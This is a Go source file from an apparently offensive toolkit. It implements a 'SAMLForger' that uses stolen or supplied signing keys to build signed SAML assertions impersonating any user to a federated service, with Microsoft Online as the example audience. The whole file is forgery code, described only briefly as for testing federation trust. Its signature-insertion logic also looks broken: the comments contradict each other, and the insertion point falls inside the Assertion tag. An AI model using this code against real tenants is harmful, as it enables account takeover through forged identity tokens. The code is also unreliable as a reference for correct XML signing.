package token

import (
	"fmt"
	"time"

	"github.com/Debajyoti0-0/aether/internal/protocol/saml"
	"github.com/Debajyoti0-0/aether/internal/types"
)

// SAMLForger builds signed SAML assertions for testing federation trust.
type SAMLForger struct {
	Signer *saml.Signer
}

// NewSAMLForger creates a forger from PEM key material.
func NewSAMLForger(keyPEM []byte, certBase64 string) (*SAMLForger, error) {
	signer, err := saml.NewSigner(keyPEM, certBase64)
	if err != nil {
		return nil, err
	}
	return &SAMLForger{Signer: signer}, nil
}

// ForgeOptions configure the forged assertion.
type ForgeOptions struct {
	Issuer     string        // trusted IdC entity id in the tenant
	Subject    string        // NameID (user UPN or immutable ID)
	Audience   string        // e.g. urn:federation:MicrosoftOnline
	Recipient  string        // ACS URL of the SP
	Lifetime   time.Duration // defaults to 5 minutes
	Attributes []saml.Attribute
}

// Forge builds a SAML assertion ready for exchange at the SP.
func (f *SAMLForger) Forge(opts ForgeOptions) (*types.SAMLAssertion, error) {
	builder := saml.NewBuilder(opts.Issuer)

	assertion, err := builder.Build(saml.BuildOptions{
		Subject:    opts.Subject,
		Audience:   opts.Audience,
		Recipient:  opts.Recipient,
		Lifetime:   opts.Lifetime,
		Attributes: opts.Attributes,
	})
	if err != nil {
		return nil, fmt.Errorf("build assertion: %w", err)
	}

	// Sign the assertion body (digest + signature value). The enveloped
	// ds:Signature element is appended before delivery.
	sigValue, digest, err := f.Signer.SignDigest([]byte(assertion.Raw))
	if err != nil {
		return nil, fmt.Errorf("sign assertion: %w", err)
	}

	assertion.Raw = appendSignature(assertion.Raw, f.Signer.KeyInfoXML(), digest, sigValue)
	return assertion, nil
}

// appendSignature inserts a ds:Signature element before the Issuer
// element per the enveloped signature profile.
func appendSignature(doc, keyInfo, digestB64, sigValue string) string {
	sig := fmt.Sprintf(
		`<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">`+
			`<ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>`+
			`<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>`+
			`<ds:Reference URI=""><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/></ds:Transforms>`+
			`<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>`+
			`<ds:DigestValue>%s</ds:DigestValue></ds:Reference></ds:SignedInfo>`+
			`<ds:SignatureValue>%s</ds:SignatureValue>%s</ds:Signature>`,
		digestB64, sigValue, keyInfo)

	// Insert right after the opening Assertion element.
	const openTag = ">"
	idx := indexOfAssertionOpen(doc)
	if idx < 0 {
		return doc + sig
	}
	insertAt := idx + len(openTag)
	return doc[:insertAt] + sig + doc[insertAt:]
}

func indexOfAssertionOpen(doc string) int {
	for i := 0; i+len(openAssertionTag) <= len(doc); i++ {
		if doc[i:i+len(openAssertionTag)] == openAssertionTag {
			return i
		}
	}
	return -1
}

const openAssertionTag = "<Assertion"
